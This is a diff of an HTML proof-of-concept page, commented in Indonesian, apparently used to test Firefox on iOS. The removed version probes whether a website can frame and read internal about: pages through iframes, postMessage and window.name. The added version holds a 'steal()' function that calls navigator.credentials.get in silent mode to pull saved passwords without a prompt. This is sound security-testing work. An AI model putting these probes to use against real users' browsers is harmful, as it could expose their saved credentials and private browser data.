@@ -3,105 +3,38 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>About Pages Test</title>
+  <title>Credential Test</title>
 </head>
 <body style="font-family: sans-serif; padding: 20px; background: #ffffff;">
-  <h1>【entity-Firefox¦canonical_name=Firefox】 iOS - About Pages Test</h1>
-  <p>Ini ngetes apakah halaman internal 【entity-Firefox¦canonical_name=Firefox】 bisa dibuka dari website biasa lewat iframe.</p>
+  <p>Website attacker manggil navigator.credentials.get() dengan mediation: 'silent' (tanpa popup).</p>
+  <p>Kalau password yang ke-save langsung muncul, berarti BUG.</p>
 
-  <h2>1. Pilih halaman yang mau dites:</h2>
-  <button onclick="load('about:home')" style="font-size:16px; padding:10px; margin:5px;">about:home</button>
-  <button onclick="load('about:private')" style="font-size:16px; padding:10px; margin:5px;">about:private</button>
-  <button onclick="load('about:logins')" style="font-size:16px; padding:10px; margin:5px;">about:logins</button>
-  <button onclick="load('about:config')" style="font-size:16px; padding:10px; margin:5px;">about:config</button>
-  <button onclick="load('about:blank')" style="font-size:16px; padding:10px; margin:5px;">about:blank (kontrol)</button>
-
+  <button onclick="steal()" style="font-size: 20px; padding: 15px 30px;">Coba Ambil Password</button>
   <br><br>
-  <h2>2. Iframe-nya:</h2>
-  <iframe id="f" src="about:blank" style="width:100%; height:300px; border:2px solid #000;"></iframe>
-
-  <br><br>
-  <h2>3. Hasil tes:</h2>
-  <button onclick="readIframe()" style="font-size:18px; padding:12px 20px;">Cek Apakah Bisa Dibaca?</button>
-  <button onclick="tryPostMessage()" style="font-size:18px; padding:12px 20px;">Coba postMessage</button>
-  <button onclick="tryWindowName()" style="font-size:18px; padding:12px 20px;">Coba window.name</button>
-
-  <pre id="o" style="background:#f0f0f0; padding:15px; white-space:pre-wrap; font-size:14px;">Belum dites. Pencet salah satu tombol about: di atas dulu, terus pencet Cek.</pre>
+  <pre id="o" style="background: #f0f0f0; padding: 15px; white-space: pre-wrap; font-size: 16px;">Belum dites. Pencet tombol di atas.</pre>
 
   <script>
-    var currentUrl = "about:blank";
-    var f = document.getElementById('f');
-    var o = document.getElementById('o');
-
-    function load(url){
-      currentUrl = url;
-      f.src = url;
-      o.innerText = "Loading: " + url + "\n\nTunggu 2 detik, liat apakah iframe di atas nampilin halaman internal Firefox (misal halaman Home yang ada shortcut + history lu) atau malah putih kosong / error.\n\nKalau iframe-nya nampilin halaman Home / Logins lu, screenshot itu. Itu udah leak, walaupun belum bisa dibaca pake JS.";
-      // Auto cek setelah 2 detik
-      setTimeout(readIframe, 2000);
-    }
-
-    function readIframe(){
-      o.innerText = "Ngetes: " + currentUrl + "\n\n";
+    async function steal(){
+      var o = document.getElementById('o');
+      o.innerText = "Mencoba navigator.credentials.get() mediation silent...\n";
       try{
-        var doc = f.contentDocument;
-        if(!doc){
-          o.innerText += "Hasil: contentDocument = null (diblokir, aman untuk baca)\n";
-          o.innerText += "TAPI cek visual: Apakah iframe di atas nampilin halaman internal Firefox? Kalau iya, itu masih leak secara visual, screenshot aja.";
-          return;
+        const cred = await navigator.credentials.get({
+          password: true,
+          mediation: 'silent'
+        });
+        if(!cred){
+          o.innerText += "\nHasil: null\nAMAN - Firefox nge-block silent access, gak ngasih password tanpa popup.";
+        } else {
+          o.innerText += "\nBUG! DAPET CREDENTIAL TANPA POPUP!\n";
+          o.innerText += "ID: " + cred.id + "\n";
+          o.innerText += "Password: " + cred.password + "\n";
+          o.innerText += "Type: " + cred.type + "\n";
+          o.innerText += "\nScreenshot ini, ini bukti Credential Leak.";
         }
-        o.innerText += "BUG! Bisa baca contentDocument!\n";
-        o.innerText += "Title: " + doc.title + "\n";
-        o.innerText += "URL: " + doc.URL + "\n";
-        o.innerText += "Body (500 karakter pertama):\n" + doc.body.innerHTML.slice(0, 500);
       }catch(e){
-        o.innerText += "Diblokir saat dibaca pake JS (aman untuk baca): " + e + "\n\n";
-        o.innerText += "TAPI cek visual: Apakah iframe di atas nampilin halaman internal Firefox (Home / Logins / Private)?\n";
-        o.innerText += "Kalau iya, itu LEAK secara visual. Screenshot iframe-nya.\n";
-        o.innerText += "Kalau iframe-nya putih kosong / error, berarti aman, about: pages diblokir total.";
+        o.innerText += "\nError (AMAN - diblokir): " + e;
       }
     }
-
-    function tryPostMessage(){
-      o.innerText = "Ngetes postMessage ke: " + currentUrl + "\n\n";
-      try{
-        f.contentWindow.postMessage("PING_FROM_ATTACKER", "*");
-        o.innerText += "postMessage terkirim.\n";
-        o.innerText += "Tunggu 2 detik, liat apakah ada balasan / apakah halaman internal-nya berubah.\n";
-        o.innerText += "Kalau halaman internal-nya merespon postMessage dari website, itu BUG (postMessage injection).";
-      }catch(e){
-        o.innerText += "postMessage diblokir: " + e;
-      }
-    }
-
-    function tryWindowName(){
-      o.innerText = "Ngetes window.name...\n\n";
-      try{
-        // Coba set window.name di iframe, terus baca balik
-        f.contentWindow.name = "INJECTED_BY_ATTACKER_12345";
-        setTimeout(function(){
-          try{
-            var name = f.contentWindow.name;
-            o.innerText += "window.name di iframe: " + name + "\n\n";
-            if(name === "INJECTED_BY_ATTACKER_12345"){
-              o.innerText += "BUG! Bisa nulis + baca window.name di halaman internal!\n";
-              o.innerText += "window.name ini bisa dipake buat nyelundupin data antar halaman internal dan website.";
-            } else {
-              o.innerText += "Aman, window.name gak bisa ditimpa / dibaca.";
-            }
-          }catch(e){
-            o.innerText += "Baca window.name diblokir: " + e;
-          }
-        }, 500);
-      }catch(e){
-        o.innerText += "Tulis window.name diblokir: " + e;
-      }
-    }
-
-    // Dengerin balasan postMessage dari iframe
-    window.addEventListener('message', function(e){
-      o.innerText += "\n\n[postMessage BALASAN DITERIMA]\nOrigin: " + e.origin + "\nData: " + JSON.stringify(e.data).slice(0,500);
-    });
   </script>
 </body>
 </html>
